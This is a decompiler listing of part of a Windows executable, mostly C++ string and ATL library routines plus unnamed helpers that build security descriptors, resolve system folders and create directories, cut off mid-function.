basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          unsigned_int param_1,unsigned_int param_2)

{
  uint uVar1;
  code *pcVar2;
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar3;
  char *unaff_EDI;
  int iVar4;
  
  uVar1 = *(uint *)(this + 0x10);
  if (uVar1 < param_1) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EDI);
    pcVar2 = (code *)swi(3);
    pbVar3 = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
             (*pcVar2)();
    return pbVar3;
  }
  if (param_2 < uVar1 - param_1) {
    if (param_2 != 0) {
      pbVar3 = this;
      if (0xf < *(uint *)(this + 0x14)) {
        pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                  this;
      }
      iVar4 = uVar1 - param_2;
      if (iVar4 - param_1 != 0) {
        FID_conflict__memcpy(pbVar3 + param_1,pbVar3 + param_1 + param_2,iVar4 - param_1);
      }
      *(int *)(this + 0x10) = iVar4;
      pbVar3 = this;
      if (0xf < *(uint *)(this + 0x14)) {
        pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                  this;
      }
      pbVar3[iVar4] =
           (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
    }
  }
  else {
    *(unsigned_int *)(this + 0x10) = param_1;
    pbVar3 = this;
    if (0xf < *(uint *)(this + 0x14)) {
      pbVar3 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                this;
    }
    pbVar3[param_1] =
         (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  }
  return this;
}



uint __fastcall FUN_00401964(undefined4 *param_1,undefined2 param_2,char *param_3,char param_4)

{
  code *pcVar1;
  char *pcVar2;
  uint uVar3;
  
  if (param_3 != (char *)0xffffffff) {
    if ((char *)param_1[5] < param_3) {
      FUN_00401a03(param_1,param_3,(char *)param_1[4]);
    }
    else if ((param_4 == '\0') || ((char *)0xf < param_3)) {
      if (param_3 == (char *)0x0) {
        param_1[4] = 0;
        if (0xf < (uint)param_1[5]) {
          param_1 = (undefined4 *)*param_1;
        }
        *(undefined *)param_1 = 0;
      }
    }
    else {
      pcVar2 = (char *)param_1[4];
      if (param_3 < (char *)param_1[4]) {
        pcVar2 = param_3;
      }
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
                 param_1,true,(unsigned_int)pcVar2);
    }
    return (uint)(param_3 != (char *)0x0);
  }
  FUN_00422ea9(param_1,param_2);
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



// Library Function - Single Match
//  public: bool __thiscall std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::_Inside(char const *)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Inside
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          char *param_1)

{
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar1;
  
  if (param_1 != (char *)0x0) {
    pbVar1 = this;
    if (0xf < *(uint *)(this + 0x14)) {
      pbVar1 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                this;
    }
    if (pbVar1 <= param_1) {
      pbVar1 = this;
      if (0xf < *(uint *)(this + 0x14)) {
        pbVar1 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                  this;
      }
      if (param_1 < pbVar1 + *(int *)(this + 0x10)) {
        return true;
      }
    }
  }
  return false;
}



void __thiscall FUN_00401a03(void *this,char *param_1,char *param_2)

{
  uint uVar1;
  uint uVar2;
  void *_Src;
  char *pcVar3;
  
  pcVar3 = (char *)((uint)param_1 | 0xf);
  if (pcVar3 != (char *)0xffffffff) {
    uVar1 = *(uint *)((int)this + 0x14);
    uVar2 = uVar1 >> 1;
    param_1 = pcVar3;
    if ((uint)pcVar3 / 3 < uVar2) {
      if (-uVar2 - 2 < uVar1) {
        param_1 = (char *)0xfffffffe;
      }
      else {
        param_1 = (char *)(uVar2 + uVar1);
      }
    }
  }
  pcVar3 = std::_Allocate_char_((unsigned_int)(param_1 + 1),(char *)0x0);
  if (param_2 != (char *)0x0) {
    _Src = this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      _Src = *this;
    }
    if (param_2 != (char *)0x0) {
      FID_conflict__memcpy(pcVar3,_Src,(size_t)param_2);
    }
  }
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)this,
             true,0);
  if (this != (void *)0x0) {
    *(char **)this = pcVar3;
  }
  *(char **)((int)this + 0x14) = param_1;
  *(char **)((int)this + 0x10) = param_2;
  if ((char *)0xf < param_1) {
                    // WARNING: Load size is inaccurate
    this = *this;
  }
  *(char *)((int)this + (int)param_2) = '\0';
  return;
}



// Library Function - Single Match
//  char * __cdecl std::_Allocate<char>(unsigned int,char *)
// 
// Library: Visual Studio 2012 Release

char * __cdecl std::_Allocate_char_(unsigned_int param_1,char *param_2)

{
  char *pcVar1;
  undefined8 uVar2;
  
  pcVar1 = (char *)0x0;
  if ((param_1 != 0) &&
     (uVar2 = FUN_00416f82(param_1), pcVar1 = (char *)uVar2, pcVar1 == (char *)0x0)) {
    uVar2 = FUN_00422e78(0,(int)((ulonglong)uVar2 >> 0x20));
    return (char *)uVar2;
  }
  return pcVar1;
}



int ** __fastcall FUN_00401aca(int **param_1)

{
  code *pcVar1;
  int *piVar2;
  int **ppiVar3;
  
  piVar2 = (int *)(**(code **)(**param_1 + 0x10))();
  ppiVar3 = param_1 + 3;
  if (((int)*ppiVar3 < 0) || (piVar2 != *param_1)) {
    ppiVar3 = (int **)(**(code **)*piVar2)(param_1[1],2);
    if (ppiVar3 == (int **)0x0) {
      FUN_00401c40();
      pcVar1 = (code *)swi(3);
      ppiVar3 = (int **)(*pcVar1)();
      return ppiVar3;
    }
    ppiVar3[1] = param_1[1];
    FUN_00423348((int)param_1[1] * 2 + 2);
  }
  else {
    LOCK();
    *ppiVar3 = (int *)((int)*ppiVar3 + 1);
    ppiVar3 = param_1;
  }
  return ppiVar3;
}



int * __thiscall FUN_00401b2a(void *this,int *param_1)

{
  int iVar1;
  int **ppiVar2;
  int **ppiVar3;
  
  iVar1 = *param_1;
                    // WARNING: Load size is inaccurate
  ppiVar3 = (int **)(*this + -0x10);
  ppiVar2 = (int **)(iVar1 + -0x10);
  if (ppiVar2 != ppiVar3) {
    if ((*(int *)(*this + -4) < 0) || (*ppiVar2 != *ppiVar3)) {
      FUN_00401d64(this,iVar1,*(int *)(iVar1 + -0xc));
    }
    else {
      ppiVar2 = FUN_00401aca(ppiVar2);
      FUN_00401df0(ppiVar3);
      *(int ***)this = ppiVar2 + 4;
    }
  }
  return (int *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall ATL::CSimpleStringT<char,0>::CSimpleStringT<char,0>(struct ATL::IAtlStringMgr
// *)
//  public: __thiscall ATL::CSimpleStringT<wchar_t,0>::CSimpleStringT<wchar_t,0>(struct
// ATL::IAtlStringMgr *)
// 
// Library: Visual Studio 2012 Release

int * __thiscall CSimpleStringT__(void *this,int *param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  
  if (param_1 != (int *)0x0) {
    iVar2 = (**(code **)(*param_1 + 0xc))();
    *(int *)this = iVar2 + 0x10;
    return (int *)this;
  }
  ATL::AtlThrowImpl(-0x7fffbffb);
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



void __fastcall FUN_00401ba1(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  piVar1 = *(int **)(iVar2 + -0x10);
  if (*(int *)(iVar2 + -0xc) != 0) {
    if (*(int *)(iVar2 + -4) < 0) {
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,0);
    }
    else {
      FUN_00401df0((int **)(iVar2 + -0x10));
      iVar2 = (**(code **)(*piVar1 + 0xc))();
      *param_1 = iVar2 + 0x10;
    }
  }
  return;
}



void __thiscall FUN_00401bd6(void *this,undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  code *pcVar3;
  undefined4 *puVar4;
  int iVar5;
  int extraout_ECX;
  
                    // WARNING: Load size is inaccurate
  iVar1 = *this;
  uVar2 = *(undefined4 *)(iVar1 + -0xc);
  puVar4 = (undefined4 *)(**(code **)(**(int **)(iVar1 + -0x10) + 0x10))();
  iVar5 = (**(code **)*puVar4)(param_1,2);
  if (iVar5 != 0) {
    FUN_00423348(extraout_ECX);
    *(undefined4 *)(iVar5 + 4) = uVar2;
    FUN_00401df0((int **)(iVar1 + -0x10));
    *(int *)this = iVar5 + 0x10;
    return;
  }
  FUN_00401c40();
  pcVar3 = (code *)swi(3);
  (*pcVar3)();
  return;
}



void FUN_00401c40(void)

{
  code *pcVar1;
  
  ATL::AtlThrowImpl(-0x7ff8fff2);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(int)
// 
// Library: Visual Studio 2012 Release

void __thiscall ATL::CSimpleStringT<char,0>::Reallocate(CSimpleStringT_char_0_ *this,int param_1)

{
  code *pcVar1;
  int iVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)(*(int *)this + -0x10);
  if ((*(int *)(*(int *)this + -8) < param_1) && (0 < param_1)) {
    iVar2 = (**(code **)(**ppiVar3 + 8))(ppiVar3,param_1,2);
    if (iVar2 != 0) {
      *(int *)this = iVar2 + 0x10;
      return;
    }
  }
  FUN_00401c40();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(int)
// 
// Library: Visual Studio 2012 Release

void __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite2(CSimpleStringT_char_0_ *this,int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)this;
  if (*(int *)(iVar1 + -0xc) != param_1 && param_1 <= *(int *)(iVar1 + -0xc)) {
    param_1 = *(int *)(iVar1 + -0xc);
  }
  if (*(int *)(iVar1 + -4) < 2) {
    iVar1 = *(int *)(iVar1 + -8);
    if (iVar1 < param_1) {
      if (iVar1 < 0x40000001) {
        iVar1 = iVar1 + iVar1 / 2;
      }
      else {
        iVar1 = iVar1 + 0x100000;
      }
      if (iVar1 < param_1) {
        iVar1 = param_1;
      }
      Reallocate(this,iVar1);
    }
  }
  else {
    FUN_00401bd6(this,param_1);
  }
  return;
}



// Library Function - Single Match
//  private: char * __thiscall ATL::CSimpleStringT<char,0>::PrepareWrite(int)
// 
// Library: Visual Studio 2012 Release

char * __thiscall
ATL::CSimpleStringT<char,0>::PrepareWrite(CSimpleStringT_char_0_ *this,int param_1)

{
  code *pcVar1;
  char *pcVar2;
  
  if (-1 < param_1) {
    if ((int)(1U - *(int *)(*(int *)this + -4) | *(int *)(*(int *)this + -8) - param_1) < 0) {
      PrepareWrite2(this,param_1);
    }
    return *(char **)this;
  }
  AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  pcVar2 = (char *)(*pcVar1)();
  return pcVar2;
}



// Library Function - Single Match
//  void __stdcall ATL::AtlThrowImpl(long)
// 
// Library: Visual Studio 2015 Release

void ATL::AtlThrowImpl(long param_1)

{
  code *pcVar1;
  
  RaiseException(((param_1 == -0x7ff8fff2) - 1 & 6) + 0xc0000017,1,0,(ULONG_PTR *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  private: void __thiscall ATL::CSimpleStringT<wchar_t,0>::SetLength(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::SetLength(CSimpleStringT_wchar_t_0_ *this,int param_1)

{
  code *pcVar1;
  
  if ((-1 < param_1) && (param_1 <= *(int *)(*(int *)this + -8))) {
    *(int *)(*(int *)this + -0xc) = param_1;
    *(undefined2 *)(*(int *)this + param_1 * 2) = 0;
    return;
  }
  AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __thiscall FUN_00401d64(void *this,int param_1,int param_2)

{
  uint uVar1;
  code *pcVar2;
  char *_Dst;
  uint uVar3;
  int extraout_ECX;
  
  if (param_2 == 0) {
    FUN_00401ba1((int *)this);
  }
  else {
    if (param_1 == 0) {
      ATL::AtlThrowImpl(-0x7ff8ffa9);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
                    // WARNING: Load size is inaccurate
    uVar3 = param_1 - *this >> 1;
    uVar1 = *(uint *)(*this + -0xc);
    _Dst = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,param_2);
    if (uVar1 < uVar3) {
      FUN_00423348(extraout_ECX);
    }
    else {
                    // WARNING: Load size is inaccurate
      _memmove_s(_Dst,*(int *)(*this + -8) * 2,_Dst + uVar3 * 2,param_2 * 2);
    }
    ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)this,param_2);
  }
  return;
}



void __fastcall FUN_00401df0(int **param_1)

{
  int **ppiVar1;
  int *piVar2;
  
  ppiVar1 = param_1 + 3;
  LOCK();
  piVar2 = *ppiVar1;
  *ppiVar1 = (int *)((int)*ppiVar1 + -1);
  if (piVar2 == (int *)0x1 || (int)piVar2 + -1 < 0) {
    (**(code **)(**param_1 + 4))(param_1);
  }
  return;
}



void FUN_00401e0b(void)

{
  return;
}



void __fastcall FUN_00401e0c(int *param_1)

{
  FUN_00401df0((int **)(*param_1 + -0x10));
  return;
}



void __cdecl FUN_00401e16(void **param_1,LPCWSTR param_2)

{
  FUN_00405d60(*param_1,(uint)param_1[1],(int)param_1[3],(int)param_1[2],param_2,&stack0x0000000c);
  return;
}



undefined4 * __thiscall FUN_00401e35(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042f170;
  FUN_00406ba6((int)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void * __fastcall FUN_00401e5a(void *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  *(undefined ***)((int)param_1 + 0x10) = &PTR_FUN_0042f168;
  *(undefined4 *)((int)param_1 + 0x14) = 0;
  *(undefined4 *)((int)param_1 + 4) = 0;
  *(undefined4 *)((int)param_1 + 8) = 0;
  *(undefined4 *)((int)param_1 + 0xc) = 0;
  return param_1;
}



void __fastcall FUN_00401e83(int *param_1)

{
  param_1[4] = (int)&PTR_FUN_0042f168;
  FUN_00404a5c(param_1 + 4);
  FUN_00401df0((int **)(*param_1 + -0x10));
  return;
}



CSimpleStringT_char_0_ * __fastcall FUN_00401e9f(CSimpleStringT_char_0_ *param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  FUN_00402fa2(param_1,L"%u.%u.%u.%u");
  return param_1;
}



undefined8 __fastcall FUN_00401eed(int *param_1)

{
  undefined8 uVar1;
  int local_90 [8];
  undefined4 local_70 [25];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_004049e3(local_90);
  FUN_004041f2(local_70,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
  FUN_0040442b(local_90,local_70,0x10000000,0);
  FUN_00404961(local_70);
  FUN_004041f2(local_70,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
  FUN_0040442b(local_90,local_70,0x10000000,0);
  FUN_00404961(local_70);
  FUN_004041f2(local_70,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
  FUN_0040442b(local_90,local_70,0x10000000,0);
  FUN_00404961(local_70);
  FUN_0040409f(param_1,local_90);
  FUN_00403da1(param_1);
  FUN_004044af(local_90);
  uVar1 = FUN_0041a954();
  return uVar1;
}



undefined8 __fastcall FUN_00401fd7(void *param_1)

{
  bool bVar1;
  uint uVar2;
  undefined8 uVar3;
  int local_164 [8];
  undefined **local_144;
  undefined4 local_140;
  undefined4 local_13c;
  undefined4 local_138;
  undefined **local_134;
  undefined4 local_130;
  undefined4 local_12c [24];
  undefined4 local_cc [24];
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_140 = 0;
  local_144 = &PTR_FUN_0042f0f4;
  local_13c = 0;
  local_138 = 0;
  bVar1 = FUN_00403cfe(&local_144,8,(HANDLE)0x0);
  if (bVar1 != false) {
    local_134 = &PTR_FUN_0042f168;
    local_130 = 0;
    FUN_00403cae(local_6c);
    uVar3 = FUN_00403be6(&local_144,local_6c);
    if ((char)uVar3 != '\0') {
      FUN_00403a22(&local_134,(int)local_6c);
      FUN_00403cae(local_cc);
      uVar3 = FUN_0040395a(&local_144,local_cc);
      if ((char)uVar3 != '\0') {
        FUN_0040389c(&local_134,(int)local_cc);
        FUN_004049e3(local_164);
        uVar3 = FUN_004037ca(&local_144,local_164);
        if ((char)uVar3 != '\0') {
          FUN_00403cae(local_12c);
          uVar3 = FUN_004032d9(&local_144,local_12c);
          if ((char)uVar3 != '\0') {
            uVar2 = FUN_0040442b(local_164,local_12c,0x10000000,0);
            if ((char)uVar2 != '\0') {
              FUN_0040409f(&local_134,local_164);
              FUN_00403299(param_1,(int *)&local_134);
            }
          }
          FUN_00404961(local_12c);
        }
        FUN_004044af(local_164);
      }
      FUN_00404961(local_cc);
    }
    FUN_00404961(local_6c);
    local_134 = &PTR_FUN_0042f168;
    FUN_00404a5c(&local_134);
  }
  local_144 = &PTR_FUN_0042f0f4;
  FUN_00403d60((int)&local_144);
  uVar3 = FUN_0041a954();
  return uVar3;
}



undefined8 __fastcall FUN_00402187(int *param_1)

{
  undefined8 uVar1;
  int local_8c [8];
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_004049e3(local_8c);
  FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
  FUN_0040442b(local_8c,local_6c,0x10000000,0);
  FUN_00404961(local_6c);
  FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
  FUN_0040442b(local_8c,local_6c,0x10000000,0);
  FUN_00404961(local_6c);
  FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
  FUN_00403a22(param_1,(int)local_6c);
  FUN_00404961(local_6c);
  FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
  FUN_0040389c(param_1,(int)local_6c);
  FUN_00404961(local_6c);
  FUN_0040409f(param_1,local_8c);
  FUN_00403da1(param_1);
  FUN_004044af(local_8c);
  uVar1 = FUN_0041a954();
  return uVar1;
}



void __fastcall FUN_00402294(void *param_1)

{
  undefined **local_c;
  undefined4 local_8;
  
  local_8 = 0;
  local_c = &PTR_FUN_0042f168;
  FUN_00402187((int *)&local_c);
  FUN_00403299(param_1,(int *)&local_c);
  local_c = &PTR_FUN_0042f168;
  FUN_00404a5c(&local_c);
  return;
}



void __fastcall FUN_004022ce(int param_1,undefined2 param_2,void *param_3)

{
  void *this;
  void *pvVar1;
  int *piVar2;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  undefined2 uVar3;
  
  this = param_3;
  FUN_00404d7b(param_3,param_2,(int)L"Global\\G");
  if ((char)param_2 == '\0') {
    piVar2 = (int *)FUN_0040139e();
    CSimpleStringT__(&param_3,piVar2);
    FUN_00407c57(&param_3);
    pvVar1 = param_3;
    FUN_004029bc(this,(int)param_3,*(int *)((int)param_3 + -0xc));
    FUN_00401fd7((void *)((int)this + 4));
    FUN_00401df0((int **)((int)pvVar1 + -0x10));
    uVar3 = extraout_DX;
  }
  else {
    FUN_00402294((void *)((int)this + 4));
    uVar3 = extraout_DX_00;
  }
  FUN_00402d6d(this,uVar3,param_1);
  return;
}



DWORD __fastcall FUN_0040233f(LPCWSTR param_1)

{
  LPCWSTR lpPathName;
  LPWSTR pWVar1;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int iVar5;
  int extraout_EDX;
  DWORD DVar6;
  undefined8 uVar7;
  LPCWSTR local_10;
  int local_c;
  LPWSTR local_8;
  
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar2);
  if ((int)(1U - *(int *)(local_8 + -2) | *(int *)(local_8 + -4) - 0x104U) < 0) {
    ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
  }
  pWVar1 = local_8;
  BVar3 = PathCanonicalizeW(local_8,param_1);
  ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
  if (BVar3 == 0) {
    DVar6 = 0x80004005;
    local_8 = pWVar1;
  }
  else {
    FUN_0040287b((char **)&local_8);
    iVar4 = FUN_004028e0(&local_8,0x5c,0);
    local_c = iVar4;
    while( true ) {
      iVar5 = iVar4;
      if (iVar4 == -1) {
        iVar5 = *(int *)(local_8 + -6);
      }
      FUN_00402958(&local_8,(int *)&local_10,iVar5);
      lpPathName = local_10;
      uVar7 = FUN_00407e50(local_10);
      if (((((char)uVar7 == '\0') &&
           (BVar3 = CreateDirectoryW(lpPathName,(LPSECURITY_ATTRIBUTES)0x0), BVar3 == 0)) &&
          (DVar6 = GetLastError(), iVar4 = local_c, DVar6 != 0x50)) && (DVar6 != 0xb7)) {
        if (0 < (int)DVar6) {
          DVar6 = DVar6 & 0xffff | 0x80070000;
        }
        FUN_00401df0((int **)(lpPathName + -8));
        goto LAB_0040244e;
      }
      if (iVar4 == -1) break;
      iVar4 = FUN_004028e0(&local_8,0x5c,iVar4 + 1);
      local_c = iVar4;
      FUN_00401df0((int **)(lpPathName + -8));
    }
    FUN_00401df0((int **)(lpPathName + -8));
    DVar6 = 0;
  }
LAB_0040244e:
  FUN_00401df0((int **)(local_8 + -8));
  return DVar6;
}



undefined8 __fastcall FUN_0040245f(uint param_1,int *param_2)

{
  int *piVar1;
  wchar_t *pwVar2;
  undefined8 uVar3;
  undefined6 uVar4;
  int local_214;
  undefined2 local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_2 != (int *)0x0) {
    FUN_00401ba1(param_2);
    local_210 = 0;
    FUN_00416e80(local_20e,0,0x206);
    uVar4 = SHGetFolderPathW(0,param_1,0,0,&local_210);
    if ((int)uVar4 < 0) {
      if ((param_1 & 0xff) == 0x26) {
        pwVar2 = L"ProgramFiles";
      }
      else {
        if ((param_1 & 0xff) != 0x1c) goto LAB_00402524;
        pwVar2 = L"LocalAppData";
      }
      piVar1 = FUN_00402781(&local_214,pwVar2);
      FUN_00401b2a(param_2,piVar1);
      FUN_00401df0((int **)(local_214 + -0x10));
    }
    else {
      FUN_00404d7b(param_2,(short)((uint6)uVar4 >> 0x20),(int)&local_210);
    }
  }
LAB_00402524:
  uVar3 = FUN_0041a954();
  return uVar3;
}



undefined8 __fastcall FUN_00402534(void *param_1,GUID *param_2)

{
  undefined8 uVar1;
  undefined local_58 [80];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_58._0_2_ = L'\0';
  FUN_00416e80((uint *)(local_58 + 2),0,0x4e);
  StringFromGUID2(param_2,(LPOLESTR)local_58,0x28);
  CharUpperW((LPWSTR)local_58);
  FUN_00404cfa(param_1,(HMODULE)local_58);
  uVar1 = FUN_0041a954();
  return uVar1;
}



uint __fastcall FUN_00402593(uint param_1)

{
  DWORD DVar1;
  int iVar2;
  
  DVar1 = GetTickCount();
  iVar2 = 0;
  if (DVar1 < param_1) {
    iVar2 = -1;
  }
  return DVar1 & 0xffffff00 | (uint)(byte)(1 - ((iVar2 - param_1) + DVar1 < 2000));
}



int * __fastcall FUN_004025b5(int *param_1,int *param_2,int **param_3)

{
  int **ppiVar1;
  int **ppiVar2;
  uint uVar3;
  int *piVar4;
  uint uVar6;
  int *local_10;
  int local_c;
  int **local_8;
  int *piVar5;
  
  local_10 = param_1;
  ppiVar2 = FUN_00401aca((int **)(*param_2 + -0x10));
  local_8 = ppiVar2 + 4;
  piVar4 = ppiVar2[1];
  do {
    piVar5 = piVar4;
    piVar4 = (int *)((int)piVar5 + -1);
    if ((int)piVar4 < 0) break;
    uVar6 = FUN_00402998(&local_8,(uint)piVar4);
  } while ((short)uVar6 == 0x5c);
  piVar4 = FUN_00402958(&local_8,&local_c,(int)piVar5);
  FUN_00401b2a(&local_8,piVar4);
  FUN_00401df0((int **)(local_c + -0x10));
  ppiVar2 = FUN_00401aca((int **)(*param_3 + -4));
  piVar4 = ppiVar2[1];
  param_3 = ppiVar2 + 4;
  uVar6 = 0;
  if (0 < (int)piVar4) {
    do {
      uVar3 = FUN_00402998(&param_3,uVar6);
      param_1 = local_10;
      if ((short)uVar3 != 0x5c) break;
      uVar6 = uVar6 + 1;
    } while ((int)uVar6 < (int)piVar4);
  }
  piVar4 = FUN_0040290f(&param_3,(int *)&local_10,(int)piVar4 - uVar6);
  FUN_00401b2a(&param_3,piVar4);
  FUN_00401df0((int **)(local_10 + -4));
  piVar4 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar4);
  ppiVar1 = local_8;
  ppiVar2 = param_3;
  FUN_00408121(param_1,0xf044);
  FUN_00401df0(ppiVar2 + -4);
  FUN_00401df0(ppiVar1 + -4);
  return param_1;
}



undefined8 __fastcall FUN_004026a4(undefined *param_1)

{
  bool bVar1;
  HANDLE pvVar2;
  uint uVar3;
  undefined8 uVar4;
  undefined **local_dc;
  undefined4 local_d8;
  undefined4 local_d4;
  undefined4 local_d0;
  undefined4 local_cc [24];
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_dc = &PTR_FUN_0042f0f4;
  local_d8 = 0;
  local_d4 = 0;
  local_d0 = 0;
  pvVar2 = GetCurrentProcess();
  bVar1 = FUN_00403cfe(&local_dc,8,pvVar2);
  if (bVar1 == false) {
    FUN_00407e13();
  }
  else {
    FUN_00403cae(local_6c);
    uVar4 = FUN_004032d9(&local_dc,local_6c);
    if ((char)uVar4 == '\0') {
      FUN_00407e13();
    }
    else {
      FUN_004041f2(local_cc,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
      uVar3 = FUN_004031c4((int)local_6c,(int)local_cc);
      *param_1 = (char)uVar3;
      FUN_00404961(local_cc);
    }
    FUN_00404961(local_6c);
  }
  local_dc = &PTR_FUN_0042f0f4;
  FUN_00403d60((int)&local_dc);
  uVar4 = FUN_0041a954();
  return uVar4;
}



int * __fastcall FUN_00402781(int *param_1,LPCWSTR param_2)

{
  int *piVar1;
  DWORD nSize;
  LPWSTR lpBuffer;
  int extraout_EDX;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  nSize = GetEnvironmentVariableW(param_2,(LPWSTR)0x0,0);
  if (nSize == 0) {
    FUN_00407e13();
  }
  else {
    lpBuffer = (LPWSTR)ATL::CSimpleStringT<char,0>::PrepareWrite
                                 ((CSimpleStringT_char_0_ *)param_1,nSize);
    GetEnvironmentVariableW(param_2,lpBuffer,nSize);
    ReleaseBuffer(param_1,extraout_EDX,-1);
  }
  return param_1;
}



void FUN_004027cc(void)

{
  return;
}



void __thiscall FUN_004027cd(void *this,int param_1,int param_2)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  
                    // WARNING: Load size is inaccurate
  iVar1 = *(int *)(*this + -0xc);
  if (-1 < param_2) {
    if (param_1 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = FUN_00423587();
    }
    if (iVar1 <= 0x7fffffff - iVar3) {
      ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)this,iVar1 + iVar3);
      FUN_00423348(iVar1);
      ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)this,iVar1 + iVar3);
      return;
    }
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



void __thiscall FUN_00402858(void *this,LPCWSTR param_1)

{
  code *pcVar1;
  
  if (param_1 != (LPCWSTR)0x0) {
                    // WARNING: Load size is inaccurate
    lstrcmpiW(*this,param_1);
    return;
  }
  ATL::AtlThrowImpl(-0x7fffbffb);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



int __fastcall FUN_0040287b(char **param_1)

{
  int iVar1;
  bool bVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  
  iVar5 = 0;
  pcVar4 = *param_1;
  bVar2 = false;
  iVar3 = 0;
  iVar1 = *(int *)(pcVar4 + -0xc);
  if (0 < iVar1) {
    do {
      iVar3 = iVar3 * 2;
      if (*(short *)(pcVar4 + iVar3) == 0x2f) {
        if (!bVar2) {
          pcVar4 = ATL::CSimpleStringT<char,0>::PrepareWrite
                             ((CSimpleStringT_char_0_ *)param_1,iVar1);
          bVar2 = true;
        }
        *(undefined2 *)(pcVar4 + iVar3) = 0x5c;
